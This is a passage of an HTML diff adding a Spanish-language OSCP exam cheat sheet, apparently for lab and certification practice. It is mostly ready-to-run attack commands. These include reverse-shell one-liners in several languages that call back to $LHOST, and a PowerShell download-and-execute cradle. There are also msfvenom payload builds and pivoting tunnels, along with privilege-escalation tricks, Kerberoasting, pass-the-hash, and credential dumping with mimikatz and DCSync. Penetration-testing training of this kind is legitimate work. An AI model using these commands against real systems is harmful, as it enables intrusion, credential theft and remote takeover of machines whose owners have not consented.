+perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");'
+# PHP
+php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+# Ruby
+ruby -rsocket -e'f=TCPSocket.open("$LHOST",$LPORT).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+# nc con -e (si la versión lo soporta)
+nc -e /bin/sh $LHOST $LPORT
+# socat (ver TTY completa abajo)
+socat TCP:$LHOST:$LPORT EXEC:/bin/sh
+# awk
+awk 'BEGIN{s="/inet/tcp/0/$LHOST/$LPORT";while(42){do{printf "shell&gt; "|&amp;s;s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&amp;s;close(c)}}while(c!="exit")close(s)}}' /dev/null</pre></div>
+
+<h3>socat — TTY totalmente interactiva (recomendado)</h3>
+<div class="code"><pre># 1) En Kali (listener que entrega una pty):
+socat file:`tty`,raw,echo=0 TCP-L:$LPORT
+# 2) En el objetivo (si tiene socat o súbelo):
+socat TCP:$LHOST:$LPORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane</pre></div>
+<div class="callout good">Esto te da una shell con autocompletado, Ctrl+C, editores y <code>sudo</code> funcionando, sin el baile de <code>stty</code>. Transfiere el binario <code>socat</code> estático si el objetivo no lo tiene.</div>
+
+<h3>Reverse shells — Windows objetivo</h3>
+<div class="code"><pre># PowerShell (una línea)
+powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
+# nc.exe transferido al objetivo
+nc.exe $LHOST $LPORT -e cmd.exe
+# ConPtyShell (TTY completa en Windows) o Invoke-PowerShellTcp.ps1 de Nishang
+# Descarga + ejecuta en memoria:
+powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"</pre></div>
+<div class="callout warn">Si Defender bloquea la cadena PowerShell, codifícala en Base64 (<code>-enc</code>), usa <code>nc.exe</code>, o genera un <code>.exe</code> con msfvenom (ver sección <a href="#msfvenom">msfvenom</a>). Para una TTY real en Windows, <b>ConPtyShell</b> es el equivalente al truco de socat.</div>
+
+<h3>Bind shells (cuando no puedes recibir conexiones salientes)</h3>
+<div class="code"><pre># Objetivo Linux escucha; tú conectas
+nc -lvnp $LPORT -e /bin/sh          # en el objetivo
+nc $IP $LPORT                       # desde Kali
+# socat bind
+socat TCP-L:$LPORT EXEC:/bin/sh     # objetivo
+socat - TCP:$IP:$LPORT              # Kali</pre></div>
+</section>
+
+<section id="transfer">
+<h2><span class="n">07</span>Transferencia de archivos</h2>
+<h4>Servidor en Kali</h4>
+<div class="code"><pre>python3 -m http.server 80           # HTTP
+# SMB (muy útil para Windows)
+impacket-smbserver share . -smb2support
+# con credenciales (Win moderno lo exige a veces):
+impacket-smbserver share . -smb2support -user a -password a</pre></div>
+<h4>Descargar en Linux objetivo</h4>
+<div class="code"><pre>wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
+curl http://$LHOST/linpeas.sh -o /tmp/linpeas.sh
+# Sin wget/curl:
+cat &lt; /dev/tcp/$LHOST/80</pre></div>
+<h4>Descargar en Windows objetivo</h4>
+<div class="code"><pre># PowerShell
+powershell -c "Invoke-WebRequest -Uri http://$LHOST/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe"
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://$LHOST/nc.exe','C:\Temp\nc.exe')"
+# certutil
+certutil -urlcache -f http://$LHOST/nc.exe nc.exe
+# Desde SMB montado
+copy \\$LHOST\share\winpeas.exe
+# evil-winrm: usa 'upload archivo' / 'download archivo'</pre></div>
+</section>
+
+<section id="pivoting">
+<h2><span class="n">08</span>Pivoting y port forwarding</h2>
+<p>Cuando comprometes un host que ve una red interna que tú no alcanzas (típico en el set de AD: llegas a un host que habla con el DC). El objetivo es enrutar tus herramientas de Kali hacia esa red a través del host comprometido.</p>
+<div class="callout warn"><b>Primero descubre la red interna:</b> <code>ip a</code> / <code>ipconfig</code>, <code>arp -a</code>, <code>route</code>. Anota la segunda interfaz y su rango (p.ej. <code>10.10.x.0/24</code>).</div>
+
+<h3>Barrido de red interna (descubrir hosts vivos)</h3>
+<p>Una vez montado el túnel, primero descubre qué hosts existen en la subred interna; luego escanea puertos/servicios host por host. No escanees el /24 entero a puertos a ciegas: es lento y ruidoso.</p>
+<div class="code"><pre># Ping sweep: solo descubre hosts vivos, no escanea puertos
+nmap -sn 172.16.1.0/24
+# Si ICMP está bloqueado, descubre por TCP a puertos comunes
+nmap -sn -PS22,80,135,445,3389 172.16.1.0/24
+# Extrae solo las IPs vivas a un archivo
+nmap -sn 172.16.1.0/24 -oG - | awk '/Up/{print $2}' &gt; vivos.txt
+# Luego, por cada host vivo, escaneo de puertos/servicios normal
+nmap -p- --min-rate 2000 -Pn 172.16.1.5</pre></div>
+<div class="callout warn">A través de <b>proxychains el ICMP no pasa</b> (solo TCP), así que el ping sweep no sirve por el túnel. Descubre con un TCP connect scan a pocos puertos y sin ping:
+<div class="code"><pre>proxychains nmap -sT -Pn -p 445,3389,5985 172.16.1.0/24</pre></div>
+Recuerda que nmap sobre proxychains da falsos negativos: confirma un host dudoso con <code>proxychains nc -nvz -w5 172.16.1.5 445</code> o <code>proxychains nxc smb 172.16.1.5</code>.</div>
+
+<h3>SSH port forwarding (si tienes credenciales SSH)</h3>
+<div class="code"><pre># Local forward: expón un puerto interno en tu Kali
+#   accede a 127.0.0.1:8080 (Kali) -> 10.10.10.5:80 (vía pivote)
+ssh -L 8080:10.10.10.5:80 usuario@$IP
+# Remote forward: el objetivo no puede salir, reenvía hacia ti
+ssh -R 9001:127.0.0.1:9001 usuario@$IP
+# Dynamic (SOCKS): proxy SOCKS en Kali para TODA la red interna
+ssh -D 1080 usuario@$IP
+# Flags útiles: -N (no shell) -f (background)
+ssh -fN -D 1080 usuario@$IP</pre></div>
+
+<h3>proxychains (enrutar cualquier herramienta por el SOCKS)</h3>
+<div class="code"><pre># /etc/proxychains4.conf -> al final:
+#   socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn -n 10.10.10.5
+proxychains crackmapexec smb 10.10.10.0/24
+proxychains evil-winrm -i 10.10.10.5 -u admin -p pass
+# Nota: por SOCKS usa TCP connect scan (-sT) y evita ping (-Pn)</pre></div>
+
+<h3>chisel (SOCKS/forwarding sin SSH — muy usado en el examen)</h3>
+<div class="code"><pre># SOCKS inverso (lo más común): servidor en Kali, cliente en el objetivo
+# En Kali:
+chisel server -p 8000 --reverse
+# En el objetivo (sube el binario chisel):
+./chisel client $LHOST:8000 R:socks
+#   -> abre un SOCKS5 en 127.0.0.1:1080 de tu Kali (úsalo con proxychains)
+
+# Port forward puntual (puerto interno -> tu Kali)
+# En el objetivo:
+./chisel client $LHOST:8000 R:3389:10.10.10.5:3389</pre></div>
+
+<h3>ligolo-ng (pivoting por interfaz tun — el más cómodo)</h3>
+<div class="code"><pre># En Kali (proxy):
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+# En el objetivo (agente):
+./agent -connect $LHOST:11601 -ignore-cert
+# En la consola de ligolo: session -> elige agente
+# añade la ruta de la red interna y empieza el túnel:
+sudo ip route add 10.10.10.0/24 dev ligolo
+# &gt;&gt; start
+# Ahora tus herramientas usan 10.10.10.x directamente, SIN proxychains</pre></div>
+<div class="callout good"><b>ligolo-ng</b> es el favorito moderno: crea una interfaz de red real, así que nmap con <code>-sS</code>, SMB y todo funciona nativo, sin el overhead de proxychains.</div>
+
+<h3>sshuttle (VPN pobre sobre SSH)</h3>
+<div class="code"><pre>sshuttle -r usuario@$IP 10.10.10.0/24
+# Enruta toda la subred por el pivote; transparente para tus herramientas</pre></div>
+
+<h3>Forwarding nativo en Windows (sin subir binarios)</h3>
+<div class="code"><pre># netsh portproxy (requiere admin): expone puerto interno en el host Windows
+netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.5
+# plink.exe (PuTTY) para dynamic forward hacia tu Kali
+plink.exe -ssh -D 1080 usuario@$LHOST</pre></div>
+
+<h3>iptables (firewall local del objetivo Linux) — caso de borde</h3>
+<div class="code"><pre># Ver las reglas actuales
+iptables -L -n
+# Abrir un puerto entrante (solo si eres root en el objetivo)
+iptables -I INPUT -p tcp --dport &lt;puerto&gt; -j ACCEPT
+# Limpiar TODAS las reglas (cuidado: puede exponer de más o cortarte)
+iptables -F</pre></div>
+<div class="callout warn">Esto es excepcional, no la vía normal. Para alcanzar un servicio interno casi siempre haces <b>tunneling</b> (chisel/ligolo/ssh), que no toca el firewall del objetivo. Solo abre/limpia iptables si ya eres root y un firewall local es lo que de verdad bloquea un puerto que necesitas exponer, y documenta el cambio para el reporte.</div>
+</section>
+
+<section id="msfvenom">
+<h2><span class="n">09</span>Payloads con msfvenom</h2>
+<div class="callout warn"><b>Regla del examen:</b> Metasploit/Meterpreter y módulos automáticos solo se permiten en <b>UNA</b> máquina de todo el examen. msfvenom (generar payloads/shellcode) sí se puede usar libremente. Ver <a href="#tips">Reglas</a>.</div>
+<div class="code"><pre># Windows exe (reverse shell no-meterpreter)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
+# Linux ELF
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell
+# Webshell PHP
+msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
+# ASPX / WAR / etc según el servidor
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
+# DLL (para hijack de servicios / privesc)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o evil.dll</pre></div>
+<p>Recibe la conexión con <code>nc -lvnp $LPORT</code> (no necesitas Metasploit para los payloads <code>shell_reverse_tcp</code>).</p>
+</section>
+
+<section id="cracking">
+<h2><span class="n">10</span>Cracking de hashes y contraseñas</h2>
+<h4>Preparar hashes</h4>
+<div class="code"><pre># Linux: combinar /etc/passwd + /etc/shadow
+unshadow passwd.txt shadow.txt &gt; unshadowed.txt
+# Extraer hash de archivos protegidos (John *2john)
+ssh2john id_rsa &gt; hash          # clave SSH con passphrase
+zip2john secreto.zip &gt; hash
+office2john doc.docx &gt; hash
+# Identificar un hash desconocido
+hashid 'HASH'   /   nth --text 'HASH'</pre></div>
+<h4>Modos de hashcat más usados en OSCP</h4>
+<div class="tbl"><table>
+<tr><th>Hash</th><th>hashcat -m</th><th>John --format</th></tr>
+<tr><td>MD5</td><td>0</td><td>raw-md5</td></tr>
+<tr><td>SHA1</td><td>100</td><td>raw-sha1</td></tr>
+<tr><td>SHA256</td><td>1400</td><td>raw-sha256</td></tr>
+<tr><td>NTLM (Windows)</td><td>1000</td><td>nt</td></tr>
+<tr><td>NetNTLMv2 (Responder)</td><td>5600</td><td>netntlmv2</td></tr>
+<tr><td>Kerberoast ($krb5tgs$)</td><td>13100</td><td>krb5tgs</td></tr>
+<tr><td>AS-REP ($krb5asrep$)</td><td>18200</td><td>krb5asrep</td></tr>
+<tr><td>bcrypt ($2a$)</td><td>3200</td><td>bcrypt</td></tr>
+<tr><td>sha512crypt ($6$)</td><td>1800</td><td>sha512crypt</td></tr>
+<tr><td>md5crypt ($1$)</td><td>500</td><td>md5crypt</td></tr>
+</table></div>
+<h4>Comandos</h4>
+<div class="code"><pre># hashcat con diccionario
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+# con reglas (muy efectivo)
+hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+# John
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashes.txt
+john --show hashes.txt
+# Mostrar crackeados de hashcat
+hashcat -m 1000 hashes.txt --show</pre></div>
+<div class="callout good"><b>rockyou</b> está en <code>/usr/share/wordlists/rockyou.txt</code> (descomprime <code>rockyou.txt.gz</code> la primera vez). Para contraseñas corporativas, genera una wordlist a medida con <code>cewl http://$IP -w custom.txt</code> y combínala con reglas.</div>
+</section>
+
+<section id="priv-linux">
+<h2><span class="n">11</span>Escalada de privilegios — Linux</h2>
+<h4>Enumeración automática</h4>
+<div class="code"><pre>./linpeas.sh | tee linpeas.out
+# Manual rápido:
+id; sudo -l; uname -a; cat /etc/os-release</pre></div>
+<div class="tbl"><table>
+<tr><th>Vector</th><th>Cómo detectarlo</th><th>Explotación</th></tr>
+<tr><td>sudo</td><td><code>sudo -l</code></td><td>Busca el binario en <a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins</a></td></tr>
+<tr><td>SUID</td><td><code>find / -perm -4000 2&gt;/dev/null</code></td><td>GTFOBins (nmap, find, vim, cp…)</td></tr>
+<tr><td>Capabilities</td><td><code>getcap -r / 2&gt;/dev/null</code></td><td><code>cap_setuid</code> en python/perl → root</td></tr>
+<tr><td>Cron jobs</td><td><code>cat /etc/crontab</code>, pspy</td><td>Script editable ejecutado por root</td></tr>
+<tr><td>PATH / wildcard</td><td>Script con binario relativo</td><td>Hijack del binario en tu PATH</td></tr>
+<tr><td>Kernel</td><td><code>uname -a</code> + searchsploit</td><td>DirtyCow, DirtyPipe, PwnKit…</td></tr>
+<tr><td>Credenciales</td><td>config, historial, .bash_history</td><td>Reusar en <code>su</code>/SSH</td></tr>
+</table></div>
+<h4>Comandos de detección manual</h4>
+<div class="code"><pre>sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null      # SUID
+getcap -r / 2&gt;/dev/null                       # capabilities
+cat /etc/crontab; ls -la /etc/cron*
+find / -writable -type d 2&gt;/dev/null          # dirs escribibles
+grep -rniE "password|passwd|pwd" /var/www 2&gt;/dev/null
+# Monitorizar procesos (crons ocultos):
+./pspy64</pre></div>
+<h4>Ejemplos GTFOBins (SUID / sudo)</h4>
+<div class="code"><pre># find con SUID
+find . -exec /bin/sh -p \; -quit
+# sudo nmap (modo interactivo)
+sudo nmap --interactive   -> !sh
+# sudo con env
+sudo vim -c ':!/bin/sh'
+# capability cap_setuid en python
+./python -c 'import os;os.setuid(0);os.system("/bin/sh")'</pre></div>
+<div class="callout crit"><b>Siempre:</b> <code>sudo -l</code> primero. Es el vector más rápido y común. Si pide contraseña y la tienes, pruébala.</div>
+</section>
+
+<section id="priv-win">
+<h2><span class="n">12</span>Escalada de privilegios — Windows</h2>
+<h4>Enumeración automática</h4>
+<div class="code"><pre>.\winPEASany.exe
+# Manual:
+whoami /priv
+whoami /all
+systeminfo</pre></div>
+<div class="tbl"><table>
+<tr><th>Vector</th><th>Detección</th><th>Explotación</th></tr>
+<tr><td>Privilegios de token</td><td><code>whoami /priv</code></td><td>SeImpersonate → Potato (abajo)</td></tr>
+<tr><td>Servicios mal permisos</td><td>winPEAS / <code>accesschk</code></td><td>Reemplazar binario del servicio</td></tr>
+<tr><td>Unquoted Service Path</td><td><code>wmic service get name,pathname</code></td><td>Plantar exe en la ruta con espacios</td></tr>
+<tr><td>Registry AutoRun / AlwaysInstallElevated</td><td>winPEAS</td><td>MSI malicioso / clave escribible</td></tr>
+<tr><td>Credenciales</td><td>unattend.xml, SAM, winPEAS</td><td>Reusar / crackear</td></tr>
+<tr><td>Kernel</td><td><code>systeminfo</code> + Watson/searchsploit</td><td>Exploit de parche faltante</td></tr>
+</table></div>
+<h4>Comandos de detección manual</h4>
+<div class="code"><pre>whoami /priv
+# Servicios y rutas sin comillas
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+# Permisos sobre un servicio (Sysinternals accesschk)
+accesschk.exe /accepteula -uwcqv usuario "NombreServicio"
+# AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Buscar contraseñas
+findstr /si password *.txt *.ini *.config *.xml</pre></div>
+<h4>Potatoes (SeImpersonatePrivilege → SYSTEM)</h4>
+<div class="code"><pre># Típico en shells de servicio (IIS, MSSQL): whoami /priv muestra SeImpersonate
+.\PrintSpoofer64.exe -i -c cmd
+.\GodPotato -cmd "cmd /c whoami"
+.\JuicyPotatoNG.exe -t * -p cmd.exe</pre></div>
+<div class="callout good">Referencia de binarios legítimos abusables en Windows: <a href="https://lolbas-project.github.io" target="_blank" rel="noopener">LOLBAS</a> (equivalente a GTFOBins).</div>
+</section>
+
+<section id="ad-enum">
+<h2><span class="n">13</span>Active Directory — Enumeración</h2>
+<p>En el set de AD obtienes credenciales iniciales (dadas o encontradas). A partir de ahí: enumerar dominio, encontrar caminos a Domain Admin. Recuerda que a menudo tendrás que <a href="#pivoting">pivotar</a> hacia la red interna para ver el DC.</p>
+<h4>Sin credenciales / con credenciales básicas</h4>
+<div class="code"><pre>enum4linux-ng -A $IP
+crackmapexec smb $IP -u usuario -p pass          # valida creds
+crackmapexec smb $IP -u usuario -p pass --users  # lista usuarios del dominio
+crackmapexec smb $IP -u usuario -p pass --shares
+ldapdomaindump -u 'dominio\usuario' -p pass $IP   # vuelca todo el dominio a HTML</pre></div>
+<h4>BloodHound (mapa de ataque del dominio)</h4>
+<div class="code"><pre># Recolector remoto desde Kali
+bloodhound-python -u usuario -p pass -d dominio.local -ns $IP -c All
+# o SharpHound.exe / SharpHound.ps1 en el host Windows
+# Luego arrancas: neo4j console  +  bloodhound  -> arrastras los .json</pre></div>
+<div class="callout good"><b>En BloodHound</b> marca a tu usuario como "Owned" y usa "Shortest Path to Domain Admins". Revisa Kerberoastable y AS-REP roastable users.</div>
+<h4>PowerView (enumeración desde un host Windows)</h4>
+<div class="code"><pre>Import-Module .\PowerView.ps1
+Get-NetUser | select samaccountname
+Get-NetGroup "Domain Admins" -FullData
+Get-NetComputer -FullData | select name
+Find-LocalAdminAccess        # dónde es admin local mi usuario</pre></div>
+<h4>Enumeración de usuarios para roasting/spraying</h4>
+<div class="code"><pre># Validar usuarios sin contraseña (Kerbrute)
+kerbrute userenum -d dominio.local --dc $IP users.txt</pre></div>
+<div class="callout good"><b>Hazlo primero:</b> <code>nxc smb $IP</code> te da el <code>name:HOSTNAME</code> y <code>domain:DOMINIO</code> reales — nunca los adivines. Agrégalos a <code>/etc/hosts</code> con todas sus formas, porque Kerberos y bloodhound-python fallan con errores de DNS confusos si falta. Si algo da <code>KRB_AP_ERR_SKEW</code>, sincroniza el reloj con <code>sudo ntpdate $IP</code>.</div>
+<div class="callout crit"><b>Cruza 2 fuentes de usuarios.</b> El bind anónimo de LDAP a veces oculta cuentas que RPC/SAMR sí muestra. Usa también <code>impacket-lookupsid dominio/guest:''@$IP</code> (fuerza bruta de RIDs) y compara: <code>diff &lt;(sort users_ldap.txt) &lt;(sort users_rpc.txt)</code>. Una lista incompleta te hace creer que no hay vector cuando sí lo hay.</div>
+</section>
+
+<section id="ad-creds-hunt">
+<h2><span class="n">13b</span>AD — Caza de credenciales</h2>
+<p>El foothold en AD casi siempre viene de una credencial encontrada, no de un exploit. Cada credencial nueva: pruébala de inmediato contra shares y hosts nuevos. El patrón real es en cadena: cred #1 → share con solo lectura → script o KeePass con cred #2 → shell.</p>
+<h4>GPP — Groups.xml (cpassword)</h4>
+<div class="code"><pre># En shares tipo SYSVOL: el atributo cpassword usa una clave AES pública
+gpp-decrypt '&lt;VALOR_DE_CPASSWORD&gt;'    # revisa userName en el mismo XML</pre></div>
+<h4>Dónde más aparecen contraseñas</h4>
+<ul class="notes">
+<li>Notas de onboarding en shares legibles por Guest (un <code>.txt</code> con la contraseña por defecto).</li>
+<li>Campo <b>Description</b> de cada usuario: <code>nxc smb $IP -u u -p p --users</code> — lee la columna Description, no solo el nombre.</li>
+<li>Scripts <code>.ps1</code>/<code>.bat</code> con credenciales hardcodeadas (<code>ConvertTo-SecureString "..." -AsPlainText</code>).</li>
+<li>KeePass <code>.kdbx</code> (ver <a href="#cracking">Cracking</a>) y spraying usuario=password (<code>nxc smb $IP -u users.txt -p users.txt --no-bruteforce</code>).</li>
+<li>Historial de PowerShell: <code>type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</li>
+</ul>
+<h4>ZIP/PFX → autenticación por certificado</h4>
+<div class="code"><pre># .pfx (cert + clave) protegido por password: crackea y separa en cert + key
+pfx2john archivo.pfx &gt; h; john --wordlist=rockyou.txt --format=pfx h
+openssl pkcs12 -in archivo.pfx -nocerts -out key.pem -nodes
+openssl pkcs12 -in archivo.pfx -clcerts -nokeys -out cert.pem
+# El certificado ES la credencial (no necesitas el password del usuario):
+evil-winrm -i $IP -c cert.pem -k key.pem -S</pre></div>
+<h4>DPAPI — credenciales guardadas (Credential Manager)</h4>
+<div class="code"><pre># Necesitas el blob (Credentials\) Y la masterkey (Protect\&lt;SID&gt;\), ambos Hidden+System
+dir C:\Users\USER\AppData\Local\Microsoft\Credentials\ -Force
+dir C:\Users\USER\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\ -Force   # whoami /user da el SID
+# En Kali, con la password en texto plano del dueño de la masterkey:
+impacket-dpapi masterkey -file '&lt;masterkey_GUID&gt;' -sid '&lt;SID&gt;' -password 'PASS'
+impacket-dpapi credential -file '&lt;blob&gt;' -key '&lt;hex_de_la_masterkey&gt;'</pre></div>
+<div class="callout good"><b>Señal de DPAPI:</b> entras con shell de un usuario y en vez de una flag encuentras carpetas <code>Credentials\</code> o <code>Protect\</code> con contenido — guardó la credencial de otra cuenta que necesitas para seguir la cadena.</div>
+</section>
+
+<section id="ad-kerberos">
+<h2><span class="n">14</span>Ataques Kerberos</h2>
+<h3>AS-REP Roasting (usuarios sin preautenticación)</h3>
+<div class="code"><pre># Sin credenciales, con lista de usuarios
+impacket-GetNPUsers dominio.local/ -usersfile users.txt -no-pass -dc-ip $IP
+# Con credenciales (enumera todos los vulnerables)
+impacket-GetNPUsers dominio.local/usuario:pass -request -dc-ip $IP
+# Crackear el hash $krb5asrep$
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</pre></div>
+<h3>Kerberoasting (cuentas de servicio con SPN)</h3>
+<div class="code"><pre>impacket-GetUserSPNs dominio.local/usuario:pass -dc-ip $IP -request
+# Crackear el hash $krb5tgs$
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt</pre></div>
+<h3>Password Spraying</h3>
+<div class="code"><pre># Una contraseña contra muchos usuarios (ojo con lockout policy)
+crackmapexec smb $IP -u users.txt -p 'Primavera2024!' --continue-on-success
+kerbrute passwordspray -d dominio.local --dc $IP users.txt 'Primavera2024!'</pre></div>
+<div class="callout warn"><b>Lockout:</b> comprueba la política (<code>crackmapexec smb $IP -u u -p p --pass-pol</code>) antes de rociar. No quemes cuentas.</div>
+</section>
+
+<section id="ad-lateral">
+<h2><span class="n">15</span>Movimiento lateral y ejecución remota</h2>
+<div class="callout good">Ya tengas <b>contraseña</b> o <b>hash NTLM</b>, casi todas las herramientas Impacket aceptan <code>-hashes :NTLMHASH</code> en lugar de contraseña (Pass-the-Hash).</div>
+<div class="tbl"><table>
+<tr><th>Herramienta</th><th>Requiere</th><th>Comando</th></tr>
+<tr><td>evil-winrm</td><td>WinRM (5985) + creds/hash</td><td><code>evil-winrm -i $IP -u u -p p</code></td></tr>
+<tr><td>psexec</td><td>SMB admin (445)</td><td><code>impacket-psexec dominio/u:p@$IP</code></td></tr>
+<tr><td>wmiexec</td><td>SMB admin, más sigiloso</td><td><code>impacket-wmiexec dominio/u:p@$IP</code></td></tr>
+<tr><td>smbexec</td><td>SMB admin</td><td><code>impacket-smbexec dominio/u:p@$IP</code></td></tr>
+</table></div>
+<h4>Pass-the-Hash (sin contraseña, solo hash NTLM)</h4>
+<div class="code"><pre>evil-winrm -i $IP -u Administrator -H NTLMHASH
+impacket-psexec dominio/Administrator@$IP -hashes :NTLMHASH
+crackmapexec smb $IP -u Administrator -H NTLMHASH</pre></div>
+<h4>Pass-the-Ticket / Overpass-the-Hash</h4>
+<div class="code"><pre># Pedir TGT con hash/clave (overpass-the-hash)
+impacket-getTGT dominio.local/usuario -hashes :NTLMHASH
+export KRB5CCNAME=usuario.ccache
+# Usar el ticket (-k -no-pass)
+impacket-psexec -k -no-pass dominio.local/usuario@target.dominio.local</pre></div>
+</section>
+
+<section id="ad-creds">
+<h2><span class="n">16</span>Volcado de credenciales</h2>
+<h4>Local (SAM/LSA) con acceso admin</h4>
+<div class="code"><pre>impacket-secretsdump dominio/Administrator:pass@$IP
+impacket-secretsdump -hashes :NTLMHASH Administrator@$IP
+# En el host (evil-winrm), mimikatz:
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</pre></div>
+<h4>DCSync (replicar hashes desde el DC)</h4>
+<div class="code"><pre># Necesitas privilegios de replicación (DA, o derechos DS-Replication)
+impacket-secretsdump dominio/usuario:pass@$DC_IP
+# Solo un usuario (p.ej. krbtgt para Golden Ticket)
+impacket-secretsdump dominio/usuario:pass@$DC_IP -just-dc-user krbtgt</pre></div>
+<h4>SAM/SYSTEM LOCAL (hash NTLM de cuentas locales, sin DCSync)</h4>
+<div class="code"><pre># Con admin local o SeBackupPrivilege en esa máquina (técnica distinta a DCSync):
+reg save HKLM\SAM sam.bak
+reg save HKLM\SYSTEM system.bak        # SYSTEM tiene la bootKey que descifra SAM
+# tráelos a Kali y descifra offline (LOCAL = no se conecta por red):
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL</pre></div>
+<div class="callout warn"><span class="real">Si el dump del DC no muestra el hash de Administrator</span> (salen otras cuentas pero no esa), pídela directa con <code>-just-dc-user Administrator</code>. <code>ERROR_DS_DRA_BAD_DN</code> suele significar que los permisos de DCSync aún no están aplicados.</div>
+</section>
+
+<section id="ad-acl">
+<h2><span class="n">16b</span>AD — Abuso de ACL y Shadow Credentials</h2>
+<p>Cuando BloodHound muestra que tu usuario tiene un permiso sobre otro objeto (no un camino de sesión). Prioriza los edges de familia ACL: son ejecutables ya, sin depender de crackear nada.</p>
+<h4>Cadena de grupos hasta WriteDacl sobre el dominio → DCSync</h4>
+<div class="code"><pre># 1) Únete al grupo intermedio que tiene el privilegio
+net rpc group addmem "GRUPO" "tu_user" -U "dominio/tu_user%pass" -S $DC_IP
+# 2) VERIFICA SIEMPRE (net rpc puede "funcionar" sin error y no aplicar nada)
+net rpc group members "GRUPO" -U "dominio/tu_user%pass" -S $DC_IP
+# 3) Auto-concédete DCSync y vuélcalo
+impacket-dacledit -action write -rights DCSync -principal tu_user -target-dn "DC=dom,DC=local" "dominio/tu_user:pass"
+impacket-secretsdump dominio/tu_user:pass@$DC_IP -just-dc</pre></div>
+<div class="callout warn">Si <code>net rpc group addmem</code> falla en silencio, usa LDAP directo (un <code>.ldif</code> con <code>changetype: modify / add: member</code> y <code>ldapmodify</code>) o <code>bloodyAD --host $IP -d dom -u u -p p add groupMember "GRUPO" tu_user</code>. La membresía puede tardar en propagarse al token: si el paso 3 da <code>INSUFF_ACCESS_RIGHTS</code>, repite el paso 1 y ejecuta el 3 justo después, sin esperar.</div>
+<h4>Shadow Credentials (GenericWrite/GenericAll sobre una CUENTA)</h4>
+<div class="code"><pre># Agrega tu propia credencial de certificado al msDS-KeyCredentialLink de la cuenta:
+certipy shadow auto -u 'tu_user@dominio' -p 'pass' -dc-ip $DC_IP -account 'cuenta_objetivo'
+# -> te devuelve el hash NT de la cuenta sin resetear su password. Luego PtH normal.
+# Alternativa: pywhisker. Si da error de reloj, antepón faketime sincronizado al DC.</pre></div>
+</section>
+
+<section id="ad-adcs">
+<h2><span class="n">16c</span>AD CS (certificados), LAPS y SeBackup</h2>
+<p>Vectores paralelos a DCSync, cada vez más comunes. Cuando BloodHound no muestra ningún camino por ACL ni Kerberos, revisa estos.</p>
+<h4>AD CS mal configurado (certipy)</h4>
+<div class="code"><pre># Enumera plantillas/CA vulnerables (usa SIEMPRE la versión más reciente de certipy)
+certipy find -u 'cuenta@dominio' -hashes ':NTHASH' -dc-ip $DC_IP -vulnerable
+# Patrón ESC general: pedir un certificado que autentique como otro usuario,
+# luego 'certipy auth -pfx admin.pfx' para obtener su hash NT (si hay desfase de
+# reloj, antepón faketime). Lee el output de 'find' para ver qué ESC aplica.</pre></div>
+<h4>LAPS (password de Administrador local en un atributo de AD)</h4>
+<div class="code"><pre># Si tu usuario tiene permiso de lectura sobre el atributo:
+nxc ldap $IP -u 'user' -p 'pass' -M laps
+# -> Computer:HOSTNAME$ User:Administrator Password:&lt;texto_plano&gt;
+evil-winrm -i $IP -u 'Administrator' -p '&lt;password_de_laps&gt;'   # admin LOCAL de esa máquina</pre></div>
+<h4>SeBackupPrivilege (leer archivos protegidos sin ser Administrator)</h4>
+<div class="code"><pre># whoami /priv muestra SeBackupPrivilege Enabled, pero type/download dan Access denied.
+# robocopy con /B usa la API de backup, que SÍ respeta el privilegio:
+robocopy /B C:\Users\Administrator\Desktop C:\Users\TU_USER\Documents\loot root.txt
+type C:\Users\TU_USER\Documents\loot\root.txt</pre></div>
